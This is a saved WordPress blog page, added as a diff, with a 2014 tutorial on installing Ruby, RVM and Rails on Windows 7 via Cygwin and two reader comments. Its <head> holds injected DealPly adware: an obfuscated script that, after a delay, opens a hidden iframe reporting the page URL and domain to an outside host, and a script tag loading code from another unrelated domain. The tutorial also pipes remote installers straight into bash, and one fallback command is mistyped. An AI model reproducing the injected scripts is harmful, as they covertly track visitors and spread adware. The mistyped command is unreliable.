@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html class="center-header d-menu sidebar-on subtle  js" prefix="og: http://ogp.me/ns#" lang="en-US"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Setting up Ruby (and Rails) on Windows 7 via Cygwin - collaborate.je</title>
+<meta charset="UTF-8">
+<script async="" type="text/javascript">(function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain   + '&topic=dpdiedarg&' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();</script><script data-rocketoptimized="true" data-rocketsrc="//www.google-analytics.com/analytics.js" async=""></script><script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"b0c0105e579472750e689518a60c819b",petok:"1f091e708a9ab24a0b0f69073e0872462f085fe1-1456461693-1800",zone:"collaborate.je",rocket:"a",apps:{},sha2test:0}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=fb690a32f5/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script><script type="text/javascript" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/cloudflare.js"></script><style type="text/css">.cf-hidden { display: none; } .cf-invisible { visibility: hidden; }</style><script data-module="cloudflare/rocket" id="cfjs_block_5fec231b5f" onload="CloudFlare.__cfjs_block_5fec231b5f_load()" onerror="CloudFlare.__cfjs_block_5fec231b5f_error()" onreadystatechange="CloudFlare.__cfjs_block_5fec231b5f_readystatechange()" type="text/javascript" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/rocket.js"></script>
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="http://collaborate.je/xmlrpc.php">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+<script data-rocketoptimized="true" type="text/rocketscript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-53856650-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+ 
+<link rel="canonical" href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Setting up Ruby (and Rails) on Windows 7 via Cygwin - collaborate.je">
+<meta property="og:description" content="I thought I’d post this here as it may be of value to some of the DJ Coding Course Cohorts (that’s a mouthful!), amongst others and it seems to fit more naturally here than it does on my other blog(s). …">
+<meta property="og:url" content="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/">
+<meta property="og:site_name" content="collaborate.je">
+<meta property="article:section" content="How To, Guides, Experiments">
+<meta property="article:published_time" content="2014-08-28T20:30:22+00:00">
+<meta property="article:modified_time" content="2014-08-29T06:50:21+00:00">
+<meta property="og:updated_time" content="2014-08-29T06:50:21+00:00">
+ 
+<link rel="alternate" type="application/rss+xml" title="collaborate.je » Feed" href="http://collaborate.je/feed/">
+<link rel="alternate" type="application/rss+xml" title="collaborate.je » Comments Feed" href="http://collaborate.je/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="collaborate.je » Setting up Ruby (and Rails) on Windows 7 via Cygwin Comments Feed" href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/feed/">
+<script data-rocketoptimized="true" type="text/rocketscript">
+			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/collaborate.je\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.1"}};
+			!function(a,b,c){function d(a){var c,d=b.createElement("canvas"),e=d.getContext&&d.getContext("2d");return e&&e.fillText?(e.textBaseline="top",e.font="600 32px Arial","flag"===a?(e.fillText(String.fromCharCode(55356,56806,55356,56826),0,0),d.toDataURL().length>3e3):"diversity"===a?(e.fillText(String.fromCharCode(55356,57221),0,0),c=e.getImageData(16,16,1,1).data.toString(),e.fillText(String.fromCharCode(55356,57221,55356,57343),0,0),c!==e.getImageData(16,16,1,1).data.toString()):("simple"===a?e.fillText(String.fromCharCode(55357,56835),0,0):e.fillText(String.fromCharCode(55356,57135),0,0),0!==e.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">img.wp-smiley,img.emoji{display:inline!important;border:none!important;box-shadow:none!important;height:1em!important;width:1em!important;margin:0 .07em!important;vertical-align:-0.1em!important;background:none!important;padding:0!important;}</style>
+<link rel="stylesheet" id="contact-form-7-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/styles.css" type="text/css" media="all">
+<link rel="stylesheet" id="parent-style-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="default-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/style_002.css" type="text/css" media="screen">
+<link rel="stylesheet" id="print-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/print.css" type="text/css" media="print">
+<!--[if (lt IE 9) & (!IEMobile)]>
+<link rel='stylesheet' id='lt-ie9-css'  href="http://collaborate.je/wp-content/themes/wharton/ie.css?4f8480" type='text/css' media='screen' />
+<![endif]-->
+<link rel="stylesheet" id="webfonts-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/leaguegothic.css" type="text/css" media="screen">
+<link rel="stylesheet" id="meanmenu-css" href="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/meanmenu.css" type="text/css" media="screen">
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-includes/js/jquery/jquery.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-includes/js/jquery/jquery-migrate.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/themes/wharton/assets/js/plugins/global-plugins.min.js?4f8480"></script>
+<link rel="https://api.w.org/" href="http://collaborate.je/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://collaborate.je/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://collaborate.je/wp-includes/wlwmanifest.xml">
+<meta name="generator" content="WordPress 4.4.1">
+<link rel="shortlink" href="http://collaborate.je/?p=73">
+<link rel="alternate" type="application/json+oembed" href="http://collaborate.je/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F">
+<link rel="alternate" type="text/xml+oembed" href="http://collaborate.je/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F&amp;format=xml">
+<style>.blog-title,article h1,h2,h3,h4,h5,h6,.blog-tagline,.more-link,.meta,.pagination,.comment-reply-link,button,input[type=submit],#menu-control,.site-navigation .sitenav-posts,footer.footer{text-transform:uppercase;}header.header{background-color:#486060;}@media only screen and (max-width: 47.9375em) {.d-menu header.header{text-align:center;}.d-menu header.header .logo,.d-menu header.header .blog-tagline{float:none;text-align:center;}}.post-image,.post-image img{width:100%;}</style>
+<style type="text/css">.recentcomments a{display:inline!important;padding:0!important;margin:0!important;}</style>
+<!--[if lt IE 9]><script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]--><script type="text/javascript" data-rocketoptimized="true" data-rocketsrc="http://collaborate.je/wp-includes/js/wp-emoji-release.min.js?ver=4.4.1"></script><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><script class="dealply_content_script" id="__DealPly__679484.549075467" type="text/javascript" data-rocketoptimized="true" data-rocketsrc="http://c.mgicinjs.info/1783138503.js?dn=collaborate.je&amp;isc=0"></script></head>
+<body data-pinterest-extension-installed="ff1.37.9" class="single single-post postid-73 single-format-standard" id="top">
+<div class="wrap animated fadeIn">
+<header class="header">
+<div class="logo">
+<a href="http://collaborate.je/" title=""><img id="logo" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/collaborate-logo-200x200.png" alt="" height="200" width="200"></a>
+</div>
+<nav style="display: block;" class="sitenav-main" id="nav" role="navigation">
+<ul id="menu-main-menu" class=""><li id="menu-item-7" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-7"><a href="http://collaborate.je/">Home</a></li>
+<li id="menu-item-8" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8"><a href="http://collaborate.je/what-is-collaborate-je/">What is collaborate.je?</a></li>
+<li id="menu-item-219" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-219"><a href="http://collaborate.je/open-device-library/">Open Device Library</a></li>
+<li id="menu-item-253" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-253"><a href="http://collaborate.je/hackjsy-friday-night-club/">Friday Night Club</a></li>
+<li id="menu-item-154" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-154"><a href="http://collaborate.je/category/meetings/hackjsy/">#hackjsy</a></li>
+<li id="menu-item-230" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-230"><a href="https://www.youtube.com/channel/UCBsOkqjnaRgeVn_lNGNU0Qw/videos">Videos</a></li>
+<li id="menu-item-15" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-15"><a href="http://collaborate.je/contact/">Contact</a></li>
+</ul> </nav>
+</header>
+<section class="main">
+<div class="content-wrapper">
+<div class="content-hold">
+<article class="post format-standard no-image post-73 type-post status-publish hentry category-howto-guides-experiments" id="post-73">
+<div class="z-wrap">
+<div class="wrapper">
+<div class="inner post-inner">
+<h1 class="entry-title post-title">Setting up Ruby (and Rails) on Windows 7 via Cygwin</h1>
+<ul class="meta top">
+<li class="time">
+<time class="post-date updated" datetime="2014-08-28">28th August 2014</time> </li>
+<li class="comments post-tags"><a href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comments">2 Comments</a></li>
+<li class="author-m post-tags">
+by <span class="vcard author post-author"><span class="fn"><a href="http://collaborate.je/author/mattc/" title="Posts by Matt Chatterley" rel="author">Matt Chatterley</a></span></span>
+</li>
+</ul>
+<div class="share">
+<a target="blank" title="Setting+up+Ruby+%28and+Rails%29+on+Windows+7+via+Cygwin" href="https://twitter.com/share?text=Setting+up+Ruby+%28and+Rails%29+on+Windows+7+via+Cygwin%20-%20&amp;url=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/&amp;via=collabje" onclick="window.open('https://twitter.com/share?text=Setting+up+Ruby+%28and+Rails%29+on+Windows+7+via+Cygwin%20-%20&amp;url=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/&amp;via=collabje','twitter','width=450,height=300,left='+(screen.availWidth/2-375)+',top='+(screen.availHeight/2-150)+'');return false;" class="social twitter  white">
+Twitter </a>
+<a target="blank" title="Setting+up+Ruby+%28and+Rails%29+on+Windows+7+via+Cygwin" href="http://www.facebook.com/share.php?u=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/" onclick="window.open('http://www.facebook.com/share.php?u=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/','facebook','width=450,height=300,left='+(screen.availWidth/2-375)+',top='+(screen.availHeight/2-150)+'');return false;" class="social facebook  white">
+Facebook </a>
+<a href="http://pinterest.com/pin/create/button/?url=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/&amp;media=&amp;description=Setting+up+Ruby+%28and+Rails%29+on+Windows+7+via+Cygwin" target="_blank" class="social pinterest  white">
+Pinterest </a>
+<a onclick="window.open('https://plus.google.com/share?url=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/','gplusshare','width=450,height=300,left='+(screen.availWidth/2-375)+',top='+(screen.availHeight/2-150)+'');return false;" href="https://plus.google.com/share?url=http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/" class="social googleplus  white">
+Google+ </a>
+</div>
+<p>I thought I’d post this here as it may be of value to some of the DJ 
+Coding Course Cohorts (that’s a mouthful!), amongst others and it seems 
+to fit more naturally here than it does on my other blog(s).</p>
+<p>I’m&nbsp;not going to dive into anything in any more detail than is 
+required to get the installation up and running;&nbsp;I’m presuming 
+you’ll be able to Google for more information where necessary! <img src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;"></p>
+<p><strong>1. Install Cygwin</strong> –&nbsp;<a href="https://cygwin.com/install.html" target="_blank">https://cygwin.com/install.html</a></p>
+<p>Cygwin is essentially a port of the GNU Development Tools to Windows 
+and gives you access to a&nbsp;*NIX-like&nbsp;environment (and shell), 
+which you can use to&nbsp;run applications and tools such as Ruby.</p>
+<p>Install&nbsp;Cygwin with the default packages, then go back and 
+search for ‘curl’ and add it to your installation (the ones under Libs 
+and Net – libcurl4 and curl respectively). Curl (cURL) is a program you 
+can use to transfer data to or from a server (essentially).</p>
+<p>Put the Cygwin installer somewhere it will be found in your path – 
+the default install path is c:\cygwin64 (presuming you are on x64), so I
+ put it in c:\cygwin64\usr\local\bin (am happy for someone who has used 
+Cygwin more extensively to correct me on this).</p>
+<p><strong>2. Install RVM</strong> – <a href="http://rvm.io/" target="_blank">http://rvm.io/</a></p>
+<p>Enter this at your cygwin shell prompt:</p>
+<p><em>curl -sSL https://get.rvm.io | bash -s stable</em></p>
+<p>I found that this didn’t always work reliably and get.rvm.io&nbsp;is actually an alias, so you may need to run this instead:</p>
+<p><em>curl -sSL&nbsp;https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | base – s stable</em></p>
+<p>If you see a warning about ~/.profile, then do:</p>
+<p><em>source ~/.profile</em></p>
+<p><strong>3. Install Ruby 1.9.3</strong></p>
+<p>Don’t worry about the fact that the latest version is 2.1.2 – I had real problems with this on windows!</p>
+<p>Launch your nice new Cygwin shell and enter:</p>
+<p><em>rvm install 1.9.3</em></p>
+<p>This is going to take a while and you’ll probably get a few different
+ prompts, e.g. administrator permission for downloads, firewall access, 
+etc. Agree to them, or it’ll fall down and go boom. You may also see the
+ cygwin installer pop up and start downloading more files – this is 
+normal.</p>
+<p>The first time I ran it, it failed, and after about ten seconds of 
+thought, I ran it again. It seems that&nbsp;sometimes cygwin doesn’t 
+manage to download all the requirements before the process continues. 
+While testing these instructions on my laptop, I actually had to run the
+ installation&nbsp;a few times (3 to be precise), waiting for the cygwin
+ installer to finish downloading each time.</p>
+<p>The installation can take quite a long time (as it will likely have 
+to build your Ruby installation from scratch), so be patient!</p>
+<p>Once it completes, it will tell you how to build documentation. Don’t. It won’t work. Just look it up online instead!</p>
+<p><strong>4. Install Rails</strong></p>
+<p>Close your cygwin terminal (or type ‘exit’ to do so), and open a new one – this is&nbsp;important or the next step wil not work.</p>
+<p>To select&nbsp;Ruby 1.9.3, do:</p>
+<p><em>rvm use 1.9.3</em></p>
+<p>Then enter:</p>
+<p><em>gem install rails</em></p>
+<p>This will download and install Rails – and all it’s requirements – which can take a while.</p>
+<p>You will also need to install sqlite. Run the cygwin installer, 
+search for “sqlite” and select&nbsp;the items under ‘Database’ and 
+‘Devel’ to be installed. Once this completes, run:</p>
+<p><em>gem install sqlite3</em></p>
+<p>In order to prove that rails is working (and to work out a few kinks), let’s quickly set up a test app:</p>
+<p><em>rails new test-app</em></p>
+<p><em>cd test-app</em></p>
+<p><em>rails server -p 8080</em></p>
+<p>This starts the Rails webserver (Rack) on port 8080 (I have stuff 
+running on loads of ports, I&nbsp;believe the default is 3000, which may
+ be fine for you).</p>
+<p>If you then visit <em>http://localhost:8080/ </em>you should see the ‘Welcome aboard’ page.</p>
+<p><strong>5. Tweak execJS</strong></p>
+<p>A&nbsp;couple of small tweaks are required to keep things happy once 
+you start generating controllers and models. Open up your equivalent of 
+c:\cygwin64\home\mattc\.rvm\gems\ruby-1.9.3-p547\gems\execjs-2.2.1\lib\execjs\runtimes.rb
+ and around line 41, you will see:</p>
+<p><em> JScript = ExternalRuntime.new(</em><br>
+<em> name: “JScript”,</em><br>
+<em> command: “cscript //E:jscript //Nologo //U”,</em><br>
+<em> runner_path: ExecJS.root + “/support/jscript_runner.js”,</em><br>
+<em> encoding: ‘UTF-16LE’ # CScript with //U returns UTF-16LE</em><br>
+<em> )</em></p>
+<p>Change this to:</p>
+<p><em>JScript = ExternalRuntime.new(</em><br>
+<em>name: “JScript”,</em><br>
+<em>command: “cscript //E:jscript //Nologo //U”,</em><br>
+<em>runner_path: ExecJS.root + “/support/jscript_runner.js”,</em><br>
+<em>encoding: ‘UTF-8’ # CScript with //U returns UTF-16LE</em><br>
+<em>)</em></p>
+<p>And finally, once you do create controllers, scaffolds – or anything else, you’ll need to edit <em>app/assets/javascripts/application.js</em> to delete&nbsp;these lines:</p>
+<p><em>//= require turbolinks</em><br>
+<em>//= require_tree .</em></p>
+<p>They’re not essential (as far as I can tell) and I just couldn’t get 
+it to work with them enabled – will try again when I have more time!</p>
+<p><strong><em>Good luck – and let me know if you run into any problems.</em></strong></p>
+<ul class="meta bottom">
+<li class="cat post-tags">Saved: <a href="http://collaborate.je/category/howto-guides-experiments/" rel="category tag">How To, Guides, Experiments</a></li>
+</ul>
+<div class="author-wrap">
+<span style="background-image: url(&quot;http://0.gravatar.com/avatar/3aa92a85cbc012ebc2736a288a8d5706?s=130&amp;d=identicon&amp;r=g&quot;);" class="author-avatar"><img alt="" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/3aa92a85cbc012ebc2736a288a8d5706.jpg" srcset="http://0.gravatar.com/avatar/3aa92a85cbc012ebc2736a288a8d5706?s=260&amp;d=identicon&amp;r=g 2x" class="avatar avatar-130 photo" height="130" width="130"></span>
+<div class="author-bio">
+<h6>By <a href="http://collaborate.je/author/mattc/">Matt Chatterley</a></h6>
+<p>Matt is a Software Developer / Architect (and an aspiring Author and Speaker, too).</p>
+</div>
+</div>
+</div>
+</div></div>
+<div class="wrapper">
+<div id="comments">
+<h5 id="respond-title"><a href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comments">Comments (2)</a></h5>
+<div style="display: none;" class="inner">
+<aside class="comments">
+</aside>
+<ol class="commentlist">
+<li class="comment byuser comment-author-robrcwd-me even thread-even depth-1" id="li-comment-7">
+<div id="comment-7">
+<span style="background-image: url(&quot;http://2.gravatar.com/avatar/e775aa7e040dd037749eaf10f57cb25e?s=130&amp;d=identicon&amp;r=g&quot;);" class="author-avatar"><img alt="" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/e775aa7e040dd037749eaf10f57cb25e.png" srcset="http://2.gravatar.com/avatar/e775aa7e040dd037749eaf10f57cb25e?s=260&amp;d=identicon&amp;r=g 2x" class="avatar avatar-130 photo" height="130" width="130"></span>
+<div class="comment-body">
+<p><a href="http://www.robdudley.com/" rel="external nofollow" class="url">Rob</a> <a class="comment-date" href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comment-7">
+28th August 2014 at 22:05</a></p>
+<div class="comment-text"><p>Great walk though Matt. One quick tweak, might be worth changing e: to c: as that will be most people’s default.</p>
+<p>Gonna give this a go on a Win 7 VM tomorrow and will feedback further if I come across anything else <img src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;"></p>
+</div>
+<div class="comment-reply">
+<a rel="nofollow" class="comment-reply-login" href="http://collaborate.je/wp-login.php?redirect_to=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F">Log in to Reply</a> </div>
+</div>
+</div>
+<ul class="children">
+<li class="comment byuser comment-author-mattc bypostauthor odd alt depth-2" id="li-comment-8">
+<div id="comment-8">
+<span style="background-image: url(&quot;http://0.gravatar.com/avatar/3aa92a85cbc012ebc2736a288a8d5706?s=130&amp;d=identicon&amp;r=g&quot;);" class="author-avatar"><img alt="" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/3aa92a85cbc012ebc2736a288a8d5706.jpg" srcset="http://0.gravatar.com/avatar/3aa92a85cbc012ebc2736a288a8d5706?s=260&amp;d=identicon&amp;r=g 2x" class="avatar avatar-130 photo" height="130" width="130"></span>
+<div class="comment-body">
+<p><a href="http://www.mattchedit.com/" rel="external nofollow" class="url">Matt Chatterley</a> <a class="comment-date" href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comment-8">
+29th August 2014 at 06:51</a></p>
+<div class="comment-text"><p>Thanks Rob – you’re right, I’ve edited the 
+post to change example paths to c:\, was a bit fried last night! Let me 
+know if I’ve missed anything, you find any other hiccups or anything 
+needs clarifying – although I haven’t used the install heavily yet, it 
+got a simple ‘Hello World’ Rails app running, so think it’s mostly 
+there.</p>
+</div>
+<div class="comment-reply">
+<a rel="nofollow" class="comment-reply-login" href="http://collaborate.je/wp-login.php?redirect_to=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F">Log in to Reply</a> </div>
+</div>
+</div>
+</li> 
+</ul> 
+</li> 
+</ol>
+<div id="respond" class="comment-respond">
+<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="http://collaborate.je/wp-login.php?redirect_to=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F">logged in</a> to post a comment.</p> </div> 
+</div>
+</div>
+</div>
+</article>
+</div>
+<div class="sidebar-hold">
+<div class="widget sidebar"><form role="search" method="get" class="searchform" action="http://collaborate.je/">
+<div>
+<input name="s" class="s" placeholder="Type and hit enter" type="text">
+<input class="searchsubmit" value="Search" type="submit">
+</div>
+</form></div> <div class="widget sidebar"> <h5>Recent Posts</h5> <ul>
+<li>
+<a href="http://collaborate.je/2015/09/thank-you-digital-health-hack/">Thank you for helping us run our Digital Health Hack!</a>
+</li>
+<li>
+<a href="http://collaborate.je/2015/09/digital-health-hackathon-2015-prizes-announced/">Digital Health Hackathon 2015 – Prizes announced!</a>
+</li>
+<li>
+<a href="http://collaborate.je/2015/09/digital-health-hackjsy-hackathon-25092015-to-27092015/">Digital Health #hackjsy Hackathon – 25/09/2015 to 27/09/2015!</a>
+</li>
+<li>
+<a href="http://collaborate.je/2015/02/open-source-day-2015-videos-now-online/">Open Source Day 2015 – Videos now Online!</a>
+</li>
+<li>
+<a href="http://collaborate.je/2015/02/open-source-day-2015-feedback-openjsy/">Open Source Day 2015 – Your Feedback – #openjsy</a>
+</li>
+</ul>
+</div> <div class="widget sidebar"><h5>Recent Comments</h5><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href="http://collaborate.je/2014/11/open-source-day-save-date-weds-11th-feb-2015/" rel="external nofollow" class="url">Open Source Day - Save the Date - Weds 11th Feb 2015 - collaborate.je</a></span> on <a href="http://collaborate.je/2014/10/open-source-trade-show-register-interest/#comment-10">Open Source ‘Trade Show’ – register your interest</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://collaborate.je/2014/10/open-source-trade-show-register-interest/" rel="external nofollow" class="url">Open Source 'Trade Show' - register your interest - collaborate.je</a></span> on <a href="http://collaborate.je/2014/10/open-source-open-day/#comment-9">An Open Source “Open Day”?</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mattchedit.com/" rel="external nofollow" class="url">Matt Chatterley</a></span> on <a href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comment-8">Setting up Ruby (and Rails) on Windows 7 via Cygwin</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.robdudley.com/" rel="external nofollow" class="url">Rob</a></span> on <a href="http://collaborate.je/2014/08/setting-ruby-rails-windows-7-via-cygwin/#comment-7">Setting up Ruby (and Rails) on Windows 7 via Cygwin</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mattchedit.com/" rel="external nofollow" class="url">Matt Chatterley</a></span> on <a href="http://collaborate.je/2014/05/drinks-chat/#comment-6">Drinks &amp; Chat</a></li></ul></div><div class="widget sidebar"><h5>Categories</h5> <ul>
+<li class="cat-item cat-item-26"><a href="http://collaborate.je/category/meetings/hackjsy/">#hackjsy</a>
+</li>
+<li class="cat-item cat-item-32"><a href="http://collaborate.je/category/meetings/madhatter/">#madhatter</a>
+</li>
+<li class="cat-item cat-item-30"><a href="http://collaborate.je/category/meetings/openjsy/">#openjsy</a>
+</li>
+<li class="cat-item cat-item-4"><a href="http://collaborate.je/category/meetings/">Events &amp; Meetings</a>
+</li>
+<li class="cat-item cat-item-25"><a href="http://collaborate.je/category/howto-guides-experiments/">How To, Guides, Experiments</a>
+</li>
+<li class="cat-item cat-item-23"><a href="http://collaborate.je/category/news-updates/">News &amp; Updates</a>
+</li>
+<li class="cat-item cat-item-28"><a href="http://collaborate.je/category/open-source/">Open Source</a>
+</li>
+<li class="cat-item cat-item-19"><a href="http://collaborate.je/category/questions-polls-surveys/">Questions, Polls &amp; Surveys</a>
+</li>
+<li class="cat-item cat-item-11"><a href="http://collaborate.je/category/tools-software/">Tools &amp; Software</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<nav class="pagination p-single">
+<div style="min-height: 183px;" class="older-posts">
+<span class="prev-post"><a href="http://collaborate.je/2014/08/fresh-look-collaborate-je/" rel="prev">.Previously</a></span>
+<span class="prev-title"><a href="http://collaborate.je/2014/08/fresh-look-collaborate-je/" rel="prev">A fresh look for collaborate.je</a></span>
+</div>
+<div class="newer-posts">
+<span class="next-post"><a href="http://collaborate.je/2014/08/jerseys-first-island-wide-hackathon-digital-jersey-hub/" rel="next">Up Next.</a></span>
+<span class="next-title"><a href="http://collaborate.je/2014/08/jerseys-first-island-wide-hackathon-digital-jersey-hub/" rel="next">Jersey’s First Island-wide Hackathon at Digital Jersey Hub</a></span>
+</div>
+</nav>
+</section>
+<footer class="footer">
+<div class="wrapper">
+<p class="copyright"> <span id="footer-text">© 2014 collaborate.je. Wharton theme by <a href="http://www.meanthemes.com/" target="_blank">MeanThemes</a></span></p>
+<div class="socials"><a class="social twitter" href="http://twitter.com/collabje" target="_blank">Twitter</a><a class="social facebook" href="https://www.facebook.com/groups/collaborateje/" target="_blank">Facebook</a></div>
+</div>
+</footer>
+</div> 
+<script data-rocketoptimized="true" type="text/rocketscript"> var ie9 = false; </script>
+<!--[if lte IE 9 ]>   
+<script> var ie9 = true; </script>
